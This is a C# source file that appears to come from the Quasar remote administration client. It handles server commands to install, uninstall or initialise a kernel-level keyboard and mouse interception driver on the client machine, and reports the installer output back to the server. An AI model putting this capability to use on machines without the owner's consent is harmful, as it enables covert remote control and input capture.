using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Threading;

using Quasar.Client.Interception;

using InputInterceptorNS;

namespace Quasar.Client.Messages
{
    public class KBMDriverHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is KBMDriverCommand;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case KBMDriverCommand msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, KBMDriverCommand message)
        {
            new Thread(delegate ()
            {
                switch (message.action)
                {
                    case "install":
                        InstallDriver(client);
                        break;
                    case "uninstall":
                        UninstallDriver(client);
                        break;
                    case "driverinit":
                        InterceptionHelper.InitializeDriver(client);
                        break;
                    default:
                        break;
                }
            }).Start();
        }

        private void InstallDriver(ISender client)
        {
            bool alreadyInstalled;
            string stdout = "";
            string stderr = "";
            //InterceptionHelper.InstallInterception(out alreadyInstalled, out stdout, out stderr);

            InputInterceptor.InstallDriver(out alreadyInstalled, out stdout, out stderr);

            if (alreadyInstalled)
            {
                client.Send(new NotifyMessageToServer { Message = "KB/M driver is already installed!" });
                return;
            }
            string tempText = "";
            if (stdout.Length > 0)
                tempText += stdout;
            tempText += "--------\n";
            if (stderr.Length > 0)
                tempText += stderr;
            client.Send(new NotifyMessageToServer { Message = tempText });
            return;
        }

        private void UninstallDriver(ISender client)
        {
            bool flag11;
            string text23;
            string text24;

            InputInterceptor.UninstallDriver(out flag11, out text23, out text24);

            //InterceptionHelper.UninstallInterception(out flag11, out text23, out text24);
            if (flag11)
            {
                client.Send(new NotifyMessageToServer { Message = "Driver is currently not installed!" });
                return;
            }
            string text25 = "";
            if (text23.Length > 0)
            {
                text25 += text23;
            }
            text25 += "--------\n";
            if (text24.Length > 0)
            {
                text25 += text24;
            }
            client.Send(new NotifyMessageToServer { Message = text25 });

            return;
        }

    }
}
